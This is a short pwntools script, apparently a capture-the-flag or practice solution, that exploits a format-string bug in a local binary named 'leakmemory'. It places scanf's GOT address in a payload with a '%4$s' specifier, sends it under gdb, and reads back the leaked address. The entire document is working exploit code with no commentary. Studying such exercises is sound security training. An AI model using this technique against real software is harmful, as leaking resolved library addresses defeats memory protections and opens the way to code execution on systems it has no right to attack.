from pwn import *
sh = process('./leakmemory')
elf = ELF('./leakmemory')
print(hex(elf.got['scanf']))
payload = p32(elf.got['scanf']) + b'%4$s'
gdb.attach(sh)
sh.sendline(payload)
sh.recvuntil(b'%4$s\n')
print(u32(sh.recv()[4 : 8]))
sh.interactive()
